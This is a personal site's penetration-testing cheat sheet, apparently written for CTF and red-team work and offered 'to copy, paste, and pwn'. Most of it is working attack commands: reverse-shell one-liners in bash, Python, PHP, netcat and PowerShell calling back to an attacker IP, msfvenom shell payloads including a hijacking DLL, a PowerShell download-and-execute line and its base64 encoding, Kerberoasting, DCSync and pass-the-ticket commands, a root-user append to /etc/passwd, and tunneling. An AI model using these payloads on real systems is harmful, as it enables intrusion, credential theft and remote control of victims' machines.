---
title: Arsenal - PwnedCake
description: Arsenal of penetration testing commands, payloads, and tools for CTFs, red teaming, and offensive security operations. Nmap, Impacket, Active Directory, and more.
keywords: Wathsala Dewmina, PwnedCake, Arsenal, Penetration Testing Tools, Offensive Security Commands, CTF Payloads, Impacket, Active Directory, Red Teaming, Nmap
author: Wathsala Dewmina
icon: fas fa-tools
order: 5
---

## Welcome to the Arsenal

My go-to commands and payloads that actually work when grinding through CTFs at 3 AM. No fluff - just copy, paste, and pwn.

---

## 🎯 Reconnaissance

**Nmap - Quick port scanning**
```bash
# Full scan with scripts
nmap -sCV -T4 --min-rate 2000 -v -oN scan.nmap -Pn <target>

# All ports
nmap -p- --min-rate 10000 -oN allports.nmap <target>
```

**Web fuzzing with ffuf**
```bash
# Directory bruteforce
ffuf -u http://target/FUZZ -w /usr/share/wordlists/dirb/common.txt -recursion

# Vhost discovery
ffuf -u http://target -H "Host: FUZZ.target.com" -w subdomains.txt -fw 1
```

---

## 💣 Reverse Shells

**One-liners that actually work**
```bash
# Bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'

# PHP
php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat (no -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f

# PowerShell
powershell -c "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/shell.ps1')"
```

**msfvenom payloads**
```bash
# Linux x64
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf

# Windows x64
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe

# DLL for hijacking
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o evil.dll
```

---

## 🔐 Password Cracking

**Hashcat essentials**
```bash
# NTLM
hashcat -m 1000 hashes.txt rockyou.txt

# Kerberoasting
hashcat -m 13100 tgs.txt rockyou.txt

# Timeroasting
hashcat -m 31300 sntp.txt rockyou.txt
```

**John the Ripper**
```bash
# Crack with wordlist
john --wordlist=rockyou.txt hashes.txt

# Zip file
zip2john file.zip > zip.hash && john zip.hash

# SSH key
ssh2john id_rsa > ssh.hash && john ssh.hash
```

---

## 🎭 Active Directory

**Impacket - The essentials**
```bash
# Get TGT
getTGT.py domain/user:password

# Kerberoasting
GetUserSPNs.py domain/user:password -dc-ip <dc> -request

# DCSync
secretsdump.py domain/user:password@dc -just-dc-ntlm

# Pass-the-Ticket
export KRB5CCNAME=ticket.ccache
psexec.py domain/user@target -k -no-pass
```

**bloodyAD - DACL abuse**
```bash
# Add to group
bloodyAD --host dc -k -d domain -u 'user' -p 'pass' add groupMember GROUP USER

# Force password change
bloodyAD --host dc -d domain -k -u 'user' -p 'pass' set password "TARGET" 'NewPass123!'
```

---

## 🚀 Privilege Escalation

**Linux quick wins**
```bash
# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Sudo permissions
sudo -l

# Capabilities
getcap -r / 2>/dev/null

# Writable /etc/passwd
echo 'hacker:$6$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
```

**Windows quick wins**
```powershell
# Check privileges
whoami /all

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
```

---

## 🛠️ Post-Exploitation

**Shell upgrade**
```bash
# Stabilize shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Then: Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

**File transfers**
```bash
# Python server
python3 -m http.server 80

# Download on Linux
wget http://10.10.14.5/file.txt
curl http://10.10.14.5/file.txt -o file.txt

# Download on Windows
certutil -urlcache -f http://10.10.14.5/file.exe file.exe
powershell IWR -Uri http://10.10.14.5/file.exe -OutFile file.exe
```

**Tunneling with Chisel**
```bash
# Server (attacker)
chisel server -p 8000 --reverse

# Client (victim)
chisel client 10.10.14.5:8000 R:1080:socks

# Use with proxychains
proxychains nmap -sT <target>
```

---

## 📦 Quick Wins

**Common default credentials**
```
admin:admin
administrator:password
root:toor
admin:admin123
```

**Generate passwords**
```bash
# Random 32 chars
openssl rand -base64 32

# Random alphanumeric
head /dev/urandom | tr -dc A-Za-z0-9 | head -c 16
```

**Base64 tricks**
```bash
# Encode
echo "text" | base64

# Decode
echo "dGV4dAo=" | base64 -d

# Encode PowerShell command
echo "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/shell.ps1')" | iconv -t UTF-16LE | base64 -w0
```

---

## 💡 Pro Tips

**Useful aliases**
```bash
alias nse='nmap -sCV -T4 --min-rate 2000 -v -oN scan.nmap'
alias serve='python3 -m http.server 80'
alias listen='rlwrap nc -lvnp'
```

**Common ports to check**
```
21 - FTP | 22 - SSH | 80 - HTTP | 88 - Kerberos
139/445 - SMB | 389 - LDAP | 443 - HTTPS
3389 - RDP | 5985 - WinRM | 3306 - MySQL
```

---

*"The right command at the right time makes all the difference."*
